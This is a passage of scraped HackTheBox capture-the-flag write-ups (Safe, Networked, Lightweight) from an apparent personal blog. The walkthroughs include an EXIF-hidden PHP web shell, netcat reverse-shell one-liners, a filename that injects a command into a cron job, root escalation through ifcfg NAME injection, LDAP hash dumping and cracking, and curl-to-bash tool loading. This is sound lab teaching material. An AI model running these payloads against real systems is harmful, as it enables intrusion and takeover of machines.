aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaXXXXXXXX Program received signal SIGSEGV, Segmentation fault. 0x00007ffff7e14e02 in __libc_start_main (main=0x40115f <main>, argc=0x1, argv=0x7fffffffe1a8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_en d=0x7fffffffe198) at ../csu/libc-start.c:308 308 ../csu/libc-start.c: No such file or directory. [ Legend: Modified register | Code | Heap | Stack | String ] ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $ rax : 0x48 $ rbx : 0x0 $ rcx : 0x00007ffff7edc673 → 0x5577fffff0003d48 ( \"H=\" ? ) $ rdx : 0x0 $ rsp : 0x00007fffffffe0d0 → 0x0000000000000000 $ rbp : 0x5858585858585858 ( \"XXXXXXXX\" ? ) $ rsi : 0x00000000004052a0 → \"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]\" $ rdi : 0x00007ffff7fad4c0 → 0x0000000000000000 $ rip : 0x00007ffff7e14e02 → <__libc_start_main+226> mov edx, DWORD PTR [ rax ] $ r8 : 0x79 $ r9 : 0x0 $ r10 : 0x00007ffff7feff40 → <strcmp+4464> pxor xmm0, xmm0 $ r11 : 0x246 $ r12 : 0x0000000000401070 → <_start+0> xor ebp, ebp $ r13 : 0x00007fffffffe1a0 → 0x0000000000000001 $ r14 : 0x0 $ r15 : 0x0 $ eflags: [ zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification ] $ cs: 0x0033 $ss : 0x002b $ds : 0x0000 $es : 0x0000 $fs : 0x0000 $gs : 0x0000 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffe0d0│+0x0000: 0x0000000000000000 ← $rsp 0x00007fffffffe0d8│+0x0008: 0x00007fffffffe1a8 → 0x00007fffffffe485 → \"/home/m4rc0ff/Documents/htbBoxes/safe/myapp\" 0x00007fffffffe0e0│+0x0010: 0x0000000100040000 0x00007fffffffe0e8│+0x0018: 0x000000000040115f → <main+0> push rbp 0x00007fffffffe0f0│+0x0020: 0x0000000000000000 0x00007fffffffe0f8│+0x0028: 0x904fee18308bbde8 0x00007fffffffe100│+0x0030: 0x0000000000401070 → <_start+0> xor ebp, ebp 0x00007fffffffe108│+0x0038: 0x00007fffffffe1a0 → 0x0000000000000001 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e14df7 <__libc_start_main+215> add BYTE PTR [rax-0x75], cl 0x7ffff7e14dfa <__libc_start_main+218> je 0x7ffff7e14e20 <__libc_start_main+256> 0x7ffff7e14dfc <__libc_start_main+220> or BYTE PTR [rbx+0x4814247c], cl → 0x7ffff7e14e02 <__libc_start_main+226> mov edx, DWORD PTR [rax] 0x7ffff7e14e04 <__libc_start_main+228> mov rax, QWORD PTR [rsp+0x18] 0x7ffff7e14e09 <__libc_start_main+233> call rax 0x7ffff7e14e0b <__libc_start_main+235> mov edi, eax 0x7ffff7e14e0d <__libc_start_main+237> call 0x7ffff7e2bfe0 <__GI_exit> 0x7ffff7e14e12 <__libc_start_main+242> mov rax, QWORD PTR [rsp+0x8] ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \"myapp\", stopped 0x7ffff7e14e02 in __libc_start_main (), reason: SIGSEGV ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x7ffff7e14e02 → __libc_start_main(main=0x40115f <main>, argc=0x1, argv=0x7fffffffe1a8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end =0x7fffffffe198) [#1] 0x40109a → _start() ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── gef➤ The application crashes, as expected, with a SIGSEGV (segmentation fault) error. We can also see the 8 X's loaded into the RBP register. Now, before going ahead I need to provide a brief explanation of the main registers: RBP is the Base Pointer, aka Frame Pointer. This pointer points to the bottom of the stack RSP is the Stack Pointer and points to the top of the stack. This is the last spot the address ends up before making it to the RIP RIP is the Instruction Pointer which contains the address of the next instruction to execute (similar to EIP for 32-bit architectures) That being said, if do again the same process I did earlier and I add 8 more bytes, let's say 8 Y's, I should see the Y's entering the RSP , let's see if this is true: gef➤ run Starting program: /home/m4rc0ff/Documents/htbBoxes/safe/myapp [Detaching after vfork from child process 3395] 08:39:00 up 2:48, 4 users, load average: 0.13, 0.03, 0.01 What do you want me to echo back? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaXXXXXXXXYYYYYYYY aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaXXXXXXXXYYYYYYYY Program received signal SIGSEGV, Segmentation fault. 0x00000000004011ac in main () [ Legend: Modified register | Code | Heap | Stack | String ] ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $ rax : 0x0 $ rbx : 0x0 $ rcx : 0x00007ffff7edc673 → 0x5577fffff0003d48 ( \"H=\" ? ) $ rdx : 0x0 $ rsp : 0x00007fffffffe0c8 → \"YYYYYYYY\" $ rbp : 0x5858585858585858 ( \"XXXXXXXX\" ? ) $ rsi : 0x00000000004052a0 → \"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]\" $ rdi : 0x00007ffff7fad4c0 → 0x0000000000000000 $ rip : 0x00000000004011ac → <main+77> ret $ r8 : 0x81 $ r9 : 0x0 $ r10 : 0x00007ffff7feff40 → <strcmp+4464> pxor xmm0, xmm0 $ r11 : 0x246 $ r12 : 0x0000000000401070 → <_start+0> xor ebp, ebp $ r13 : 0x00007fffffffe1a0 → 0x0000000000000001 $ r14 : 0x0 $ r15 : 0x0 $ eflags: [ ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification ] $ cs: 0x0033 $ss : 0x002b $ds : 0x0000 $es : 0x0000 $fs : 0x0000 $gs : 0x0000 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffe0c8│+0x0000: \"YYYYYYYY\" ← $rsp 0x00007fffffffe0d0│+0x0008: 0x0000000000000000 0x00007fffffffe0d8│+0x0010: 0x00007fffffffe1a8 → 0x00007fffffffe485 → \"/home/m4rc0ff/Documents/htbBoxes/safe/myapp\" 0x00007fffffffe0e0│+0x0018: 0x0000000100040000 0x00007fffffffe0e8│+0x0020: 0x000000000040115f → <main+0> push rbp 0x00007fffffffe0f0│+0x0028: 0x0000000000000000 0x00007fffffffe0f8│+0x0030: 0x021bf14b0677d4b5 0x00007fffffffe100│+0x0038: 0x0000000000401070 → <_start+0> xor ebp, ebp ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x4011a1 <main+66> call 0x401030 <puts@plt> 0x4011a6 <main+71> mov eax, 0x0 0x4011ab <main+76> leave → 0x4011ac <main+77> ret [!] Cannot disassemble from $PC ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \"myapp\", stopped 0x4011ac in main (), reason: SIGSEGV ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x4011ac → main() ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Now, running the checksec command as shown below: gef➤ checksec [+] checksec for '/home/m4rc0ff/Documents/htbBoxes/safe/myapp' Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial we see that NX is enabled which means we are dealing with a read-only stack and therefore we won't be able to execute shell code on it, like we did on jail . Additionally, being a 64-bit application we need to use a different approach and this is where Return Oriented Programming (ROP) comes into play. This technique involves using \"gadgets\", that is using pieces of existing assembly in the program to achieve what we want. Because of the 64-bit architecture the parameters of the functions are passed in registers. In turn we have: RDI first argument RSI second argument RDX third argument RCX fourth argument R8 - R15 fifth argument to fitfteenth argument","tags":"blogging","loc":"https://sittingducks.io/Safe.html","title":"Safe"},{"url":"https://sittingducks.io/Networked.html","text":"Recon m4rc0ff@SittingDucks:~$ nmap -sC -sV 10 .10.10.146 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 04:59 BST Nmap scan report for 10.10.10.146 Host is up (0.76s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA) | 256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA) |_ 256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn't have a title (text/html; charset=UTF-8). 443/tcp closed https Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 83.06 seconds The webpage and its source show the following content: the comment let intend there may be a gallery somewhere. I decide to scan for files and directories with gobuster : m4rc0ff@SittingDucks:~$ gobuster dir -u http://10.10.10.146 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html -t 30 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.146 [+] Threads: 30 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: html,php,txt [+] Timeout: 10s =============================================================== 2020/06/24 05:03:44 Starting gobuster =============================================================== /uploads (Status: 301) /index.php (Status: 200) /photos.php (Status: 200) /upload.php (Status: 200) /lib.php (Status: 200) /backup (Status: 301) gobuster shows there is an upload directory which I visit and it gives this result: I was able to upload a JPG file, just a screenshot of the Kali logo, which I noticed it ended up into the /photos.php page: I also notices a /backup directory where I found a tar file which I downloaded to my box: Once downloaded I extract the content and I can see we are dealing with the source code of the PHP pages we have visited: m4rc0ff@SittingDucks:~/Documents/htbBoxes/networked$ ll total 16 -rw-r--r-- 1 m4rc0ff m4rc0ff 229 Jul 9 2019 index.php -rw-r--r-- 1 m4rc0ff m4rc0ff 2001 Jul 2 2019 lib.php -rw-r--r-- 1 m4rc0ff m4rc0ff 1871 Jul 2 2019 photos.php -rw-r--r-- 1 m4rc0ff m4rc0ff 1331 Jul 2 2019 upload.php This is what's inside the upload.php file: <?php require '/var/www/html/lib.php' ; define ( \"UPLOAD_DIR\" , \"/var/www/html/uploads/\" ); if ( isset ( $_POST [ 'submit' ]) ) { if ( ! empty ( $_FILES [ \"myFile\" ])) { $myFile = $_FILES [ \"myFile\" ]; if ( ! ( check_file_type ( $_FILES [ \"myFile\" ]) && filesize ( $_FILES [ 'myFile' ][ 'tmp_name' ]) < 60000 )) { echo '<pre>Invalid image file.</pre>' ; displayform (); } if ( $myFile [ \"error\" ] !== UPLOAD_ERR_OK ) { echo \"<p>An error occurred.</p>\" ; displayform (); exit ; } //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile[\"name\"]; list ( $foo , $ext ) = getnameUpload ( $myFile [ \"name\" ]); $validext = array ( '.jpg' , '.png' , '.gif' , '.jpeg' ); $valid = false ; foreach ( $validext as $vext ) { if ( substr_compare ( $myFile [ \"name\" ], $vext , - strlen ( $vext )) === 0 ) { $valid = true ; } } if ( ! ( $valid )) { echo \"<p>Invalid image file</p>\" ; displayform (); exit ; } $name = str_replace ( '.' , '_' , $_SERVER [ 'REMOTE_ADDR' ]) . '.' . $ext ; $success = move_uploaded_file ( $myFile [ \"tmp_name\" ], UPLOAD_DIR . $name ); if ( ! $success ) { echo \"<p>Unable to save file.</p>\" ; exit ; } echo \"<p>file uploaded, refresh gallery</p>\" ; // set proper permissions on the new file chmod ( UPLOAD_DIR . $name , 0644 ); } } else { displayform (); } ?> The above code shows that there are 2 conditions for the file upload: the file size must be < 60000 the extension must be either of these: '.jpg', '.png', '.gif', '.jpeg' With this information I will use a technique where I will hide a web shell code in the image comments and then I will give the file double extension. Here the steps: I took a screenshot of my blog logo and named it SittingDucks.png add the web shell in the image with the following command: m4rc0ff@SittingDucks:~/Documents/htbBoxes/networked$ exiftool -Comment = '<?php echo \"<pre>\"; system($_GET[' cmd ']); ?>' SittingDucks.png 1 image files updated Note that the image now contains the web shell code <?php echo \"<pre>\"; system($_GET['cmd']); ?> on its comment section: m4rc0ff@SittingDucks:~/Documents/htbBoxes/networked$ exiftool SittingDucks.png ExifTool Version Number : 12.00 File Name : SittingDucks.png Directory : . File Size : 16 kB File Modification Date/Time : 2020:06:24 15:11:34+01:00 File Access Date/Time : 2020:06:24 15:11:34+01:00 File Inode Change Date/Time : 2020:06:24 15:11:34+01:00 File Permissions : rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 296 Image Height : 188 Bit Depth : 8 Color Type : RGB Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Significant Bits : 8 8 8 Comment : <?php echo \"<pre>\"; system($_GET[cmd]); ?> Image Size : 296x188 Megapixels : 0.056 I rename the image to SittingDucks.php.png and I upload it to the portal: To call the web shell and see if it works I browse to its page where I have appended ?cmd=whoami : We can see the whoami command returned the apache user. This works because the first extension is PHP and there is PHP code inserted into the image comment section. When the page is executed it looks for PHP code and executes it if find it. Now to get a full shell, I take a shellcode from pentestmonkey : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 443 >/tmp/f and since I have to run this on a URL I URL-encode it with burp (CTRL+U): rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E&1|nc%2010.10.14.13%20443%20%3E/tmp/f Then I setup a netcat listener on port 443 on my box and I replace the command whoami with the above URL-encoded string in my browser: m4rc0ff@SittingDucks:~$ sudo nc -lvnp 443 [sudo] password for m4rc0ff: listening on [any] 443 ... connect to [10.10.14.13] from (UNKNOWN) [10.10.10.146] 37382 sh: no job control in this shell sh-4.2$ whoami whoami apache sh-4.2$ python -c 'import pty;pty.spawn(\"/bin/bash\")' python -c 'import pty;pty.spawn(\"/bin/bash\")' I get a shell back which I upgraded to an interactive shell with the procedure available here . I move to the /home directory and see this: bash-4.2$ cd /home/ bash-4.2$ ls -l total 0 drwxr-xr-x. 2 guly guly 159 Jul 9 2019 guly bash-4.2$ cd guly/ bash-4.2$ ls -l total 12 -r--r--r--. 1 root root 782 Oct 30 2018 check_attack.php -rw-r--r-- 1 root root 44 Oct 30 2018 crontab.guly -r--------. 1 guly guly 33 Oct 30 2018 user.txt I am unable to read the user.txt for obvious permission reasons so we need to privesc to guly . bash-4.2$ cat crontab.guly */3 * * * * php /home/guly/check_attack.php The content of the crontab.guly shows the check_attack.php file is ran every 3rd minute of the hour. I have also run pspy to the box which confirms crond is running every 3 minutes: 2020/06/25 07:12:01 CMD: UID=0 PID=13725 | /usr/sbin/crond -n 2020/06/25 07:12:01 CMD: UID=0 PID=13726 | /usr/sbin/CROND -n 2020/06/25 07:15:01 CMD: UID=0 PID=13728 | /usr/sbin/crond -n 2020/06/25 07:15:01 CMD: UID=0 PID=13729 | /usr/sbin/CROND -n The conent of the check_attack.php shows this code: bash-4.2$ cat check_attack.php <?php require '/var/www/html/lib.php' ; $path = '/var/www/html/uploads/' ; $logpath = '/tmp/attack.log' ; $to = 'guly' ; $msg = '' ; $headers = \"X-Mailer: check_attack.php \\r\\n \" ; $files = array (); $files = preg_grep ( '/&#94;([&#94;.])/' , scandir ( $path )); foreach ( $files as $key => $value ) { $msg = '' ; if ( $value == 'index.html' ) { continue ; } #echo \"-------------\\n\"; #print \"check: $value\\n\"; list ( $name , $ext ) = getnameCheck ( $value ); $check = check_ip ( $name , $value ); if ( ! ( $check [ 0 ])) { echo \"attack! \\n \" ; # todo: attach file file_put_contents ( $logpath , $msg , FILE_APPEND | LOCK_EX ); exec ( \"rm -f $logpath \" ); exec ( \"nohup /bin/rm -f $path$value > /dev/null 2>&1 &\" ); echo \"rm -f $path$value\\n \" ; mail ( $to , $msg , $msg , $headers , \"-F $value \" ); } } ?> To summarize this is what the code does: read ( scandir ) the files in the /var/www/html/uploads directory store the file names into the $value variable check if the name stored in $value is an IP address and if not it deletes it, write a log into /tmp/attack.log and send an alert to guly via email The interesting bit is on this line: exec(\"nohup /bin/rm -f $path$value > /dev/null 2>&1 &\"); As we alredy mentioned $value is a variable which gets assigned file names present in /var/www/html/uploads . Because we can write into that directory, we can then control $value . We can then create a file in that directory and call it: shell;nc 10.10.14.13 4444 -c bash bash-4.2$ touch \"shell;nc 10.10.14.13 4444 -c bash\" bash-4.2$ ls -l total 36 -rw-r--r-- 1 apache apache 16193 Jun 25 06:40 10_10_14_13.php.png -rw-r--r--. 1 root root 3915 Oct 30 2018 127_0_0_1.png -rw-r--r--. 1 root root 3915 Oct 30 2018 127_0_0_2.png -rw-r--r--. 1 root root 3915 Oct 30 2018 127_0_0_3.png -rw-r--r--. 1 root root 3915 Oct 30 2018 127_0_0_4.png -r--r--r--. 1 root root 2 Oct 30 2018 index.html -rw-r--r-- 1 apache apache 0 Jun 25 07:57 shell;nc 10.10.14.13 4444 -c bash Then when the exec function runs will execute two commands because we added a semicolon: nohup /bin/rm -f shell nc 10.10.14.13 4444 -c bash This way when I start a netcat listner on port 4444 I will get a shell when the cron job runs again: m4rc0ff@SittingDucks:~$ sudo nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.13] from (UNKNOWN) [10.10.10.146] 56926 whoami guly python -c 'import pty;pty.spawn(\"/bin/bash\")' [guly@networked ~]$ cat user.txt cat user.txt 52****************************c5 [guly@networked ~]$ Although the crontab.guly file is owned by root, it is still a \"user\" crontab and therefore it runs as guly , this is why we are getting the shell as guly and not root . #!/bin/bash -p cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF regexp = \"&#94;[a-zA-Z0-9_\\ /-]+ $ \" for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO ; do echo \"interface $var :\" read x while [[ ! $x = ~ $regexp ]] ; do echo \"wrong input, try again\" echo \"interface $var :\" read x done echo $var = $x >> /etc/sysconfig/network-scripts/ifcfg-guly done /sbin/ifup guly0 If I run the above script, I am prompted for some values as follow: [root@networked network-scripts]# sudo /usr/local/sbin/changename.sh interface NAME: test interface PROXY_METHOD: test interface BROWSER_ONLY: test interface BOOTPROTO: test ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. This makes sense by reading the code. The error it due to the fact that guly0 device does not exist, should have been just guly Since we can write stuff inside the /etc/sysconfig/network-scripts/ifcfg-guly thanks to the script I started doing some research to see what exactly I could inject that would give me a shell. Finally I could these 2 articles that are worth a read: https://seclists.org/fulldisclosure/2019/Apr/24 https://bugzilla.redhat.com/show_bug.cgi?id=1697473 Basically the NAME attribute in the ifcfg scripts is not filtered properly. If there is a white/blank space then the system executes whatever is after that space. As an example if I write foo /bin/id to the name attribute then the system will run /bin/id . Let's see this in action: [guly@networked ~]$ sudo /usr/local/sbin/changename.sh interface NAME: foo /bin/id interface PROXY_METHOD: test interface BROWSER_ONLY: test interface BOOTPROTO: test uid=0(root) gid=0(root) groups=0(root) uid=0(root) gid=0(root) groups=0(root) ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. [guly@networked ~]$ It works! Similarly we can get a shell very easily: [guly@networked ~]$ sudo /usr/local/sbin/changename.sh interface NAME: foo /bin/bash interface PROXY_METHOD: test interface BROWSER_ONLY: test interface BOOTPROTO: test [root@networked network-scripts]# cat /root/root.txt 0a****************************82 As per the discussions in the Red Hat link I mentioned above they say \"Just so that it's absolutely clear: This is not a security issue.\". In fact, this was possible only because the user guly could run the script as root which in turn allowed us to leverage this \"weakness\".","tags":"blogging","loc":"https://sittingducks.io/Networked.html","title":"Networked"},{"url":"https://sittingducks.io/Lightweight.html","text":"Recon m4rc0ff@SittingDucks:~$ nmap -sC -sV 10 .10.10.119 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 12:08 BST Nmap scan report for lightweight.htb (10.10.10.119) Host is up (0.66s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA) | 256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA) |_ 256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519) 80/tcp closed http 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X | ssl-cert: Subject: commonName=lightweight.htb | Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain | Not valid before: 2018-06-09T13:32:51 |_Not valid after: 2019-06-09T13:32:51 |_ssl-date: TLS randomness does not represent time Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 99.93 seconds We web page on port 80 shows this: When trying to search for directories with gobuster I started seeing this: m4rc0ff@SittingDucks:~$ gobuster dir -u http://10.10.10.119 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.119 [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] Timeout: 10s =============================================================== 2020/06/22 12:19:13 Starting gobuster =============================================================== /index.php (Status: 200) /info.php (Status: 200) /user.php (Status: 200) [ERROR] 2020/06/22 12:19:23 [!] Get http://10.10.10.119/static.txt: dial tcp 10.10.10.119:80: connect: connection refused [ERROR] 2020/06/22 12:19:24 [!] Get http://10.10.10.119/programs.php: dial tcp 10.10.10.119:80: connect: connection refused [ERROR] 2020/06/22 12:19:28 [!] Get http://10.10.10.119/Home.txt: dial tcp 10.10.10.119:80: connect: connection refused [ERROR] 2020/06/22 12:19:29 [!] Get http://10.10.10.119/strona_14: dial tcp 10.10.10.119:80: connect: connection refused [ERROR] 2020/06/22 12:19:32 [!] Get http://10.10.10.119/strona_8.php: dial tcp 10.10.10.119:80: connect: connection refused [ERROR] 2020/06/22 12:19:34 [!] Get http://10.10.10.119/strona_2.txt: dial tcp 10.10.10.119:80: connect: connection refused [ERROR] 2020/06/22 12:19:35 [!] Get http://10.10.10.119/strona_3: dial tcp 10.10.10.119:80: connect: connection refused I think the website went into protection mode and shut itself down for few minutes as It came back a bit later. I left scanning directories for a moment. The nmap output shows there is an SSL certificate with common name lightweight.htb so I add this to my /etc/hosts file. m4rc0ff@SittingDucks:~$ nmap -p389 --script ldap-search 10 .10.10.119 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 14:41 BST Nmap scan report for lightweight.htb (10.10.10.119) Host is up (0.080s latency). PORT STATE SERVICE 389/tcp open ldap | ldap-search: | Context: dc=lightweight,dc=htb | dn: dc=lightweight,dc=htb | objectClass: top | objectClass: dcObject | objectClass: organization | o: lightweight htb | dc: lightweight | dn: cn=Manager,dc=lightweight,dc=htb | objectClass: organizationalRole | cn: Manager | description: Directory Manager | dn: ou=People,dc=lightweight,dc=htb | objectClass: organizationalUnit | ou: People | dn: ou=Group,dc=lightweight,dc=htb | objectClass: organizationalUnit | ou: Group | dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb | uid: ldapuser1 | cn: ldapuser1 | sn: ldapuser1 | mail: ldapuser1@lightweight.htb | objectClass: person | objectClass: organizationalPerson | objectClass: inetOrgPerson | objectClass: posixAccount | objectClass: top | objectClass: shadowAccount | userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/ | shadowLastChange: 17691 | shadowMin: 0 | shadowMax: 99999 | shadowWarning: 7 | loginShell: /bin/bash | uidNumber: 1000 | gidNumber: 1000 | homeDirectory: /home/ldapuser1 | dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb | uid: ldapuser2 | cn: ldapuser2 | sn: ldapuser2 | mail: ldapuser2@lightweight.htb | objectClass: person | objectClass: organizationalPerson | objectClass: inetOrgPerson | objectClass: posixAccount | objectClass: top | objectClass: shadowAccount | userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1 | shadowLastChange: 17691 | shadowMin: 0 | shadowMax: 99999 | shadowWarning: 7 | loginShell: /bin/bash | uidNumber: 1001 | gidNumber: 1001 | homeDirectory: /home/ldapuser2 | dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb | objectClass: posixGroup | objectClass: top | cn: ldapuser1 | userPassword: {crypt}x | gidNumber: 1000 | dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb | objectClass: posixGroup | objectClass: top | cn: ldapuser2 | userPassword: {crypt}x |_ gidNumber: 1001 Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds From the above output we found two password hashes for 2 users: ldapuser1 $6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/ ldapuser2 $6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1 From the hashcat Example hashes page I can see these hashes match the types \"sha512crypt $6$, SHA512 (Unix) 2\", that is hash-mode 1800. Armed with this info I try to crack these. m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$ hashcat -a 0 -m 1800 hash1.txt /usr/share/wordlists/rockyou.txt --force hashcat (v5.1.0) starting... OpenCL Platform #1: The pocl project ==================================== * Device #1: pthread-Intel(R) Xeon(R) E-2186M CPU @ 2.90GHz, 2048/5890 MB allocatable, 2MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 It was taking a while so I left this running and went ahead with enumeration. The Home page showed three links. If I visit info I land to this page: This is another confirmation of what I noticed before when I launched gobuster . There is also a suggestion to visit the user page if you like to get in the box! So let's see: According to this page once there is an http request to the web page, a user will be created with the user name and password of the IP address of my box and we should be allowed SSH access. m4rc0ff@SittingDucks:~$ ssh 10 .10.14.13@lightweight.htb The authenticity of host 'lightweight.htb (10.10.10.119)' can't be established. ECDSA key fingerprint is SHA256:FWyyew+o9WoPYkfIKGEbTMsexks1z8ZkSUs9O+2AMSU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'lightweight.htb' (ECDSA) to the list of known hosts. 10.10.14.13@lightweight.htb's password: Last failed login: Mon Jun 22 15:15:08 BST 2020 from 10.10.14.13 on ssh:notty There were 2 failed login attempts since the last successful login. [10.10.14.13@lightweight ~]$ whoami 10.10.14.13 [10.10.14.13@lightweight ~]$ ll total 0 The is nothing in 10.10.14.13 home directory and if I move to the /home directory I can see this: [10.10.14.13@lightweight ~]$ cd /home/ [10.10.14.13@lightweight home]$ ll total 0 drwx------. 4 10.10.14.13 10.10.14.13 91 Jun 22 15:16 10.10.14.13 drwx------. 4 10.10.14.2 10.10.14.2 91 Nov 16 2018 10.10.14.2 drwx------. 2 127.0.0.1 127.0.0.1 62 Jun 22 12:07 127.0.0.1 drwx------. 4 ldapuser1 ldapuser1 181 Jun 15 2018 ldapuser1 drwx------. 4 ldapuser2 ldapuser2 197 Jun 21 2018 ldapuser2 As expected there are the two ldap users directories as well as two more other directories. However, because of permissions we can't access any of them. After wandering around a bit and getting nowhere I ran LinEnum from my box. To do that, I set up a python SimpleHTTPServer in the directory where I have LinEnum and then I ran this command on the victim box: [10.10.14.13@lightweight home]$ curl http://10.10.14.13/LinEnum.sh | bash <SNIP> [+] Files with POSIX capabilities set: /usr/bin/ping = cap_net_admin,cap_net_raw+p /usr/sbin/mtr = cap_net_raw+ep /usr/sbin/suexec = cap_setgid,cap_setuid+ep /usr/sbin/arping = cap_net_raw+p /usr/sbin/clockdiff = cap_net_raw+p /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep /home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep /home/ldapuser1/openssl =ep <SNIP> The output is quite long so above I only reported the bit that stood out to me. Particularly, this line /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep means that a normal user would be able to run tcpdump as root . More on Linux capabilities can be read here . Interesting! This was something I hadn't thought but now that I know it's available I started to think that could be useful to sniff useful information. Because we know that there is some kind of script that creates the user with our IP, that is called when there is an http 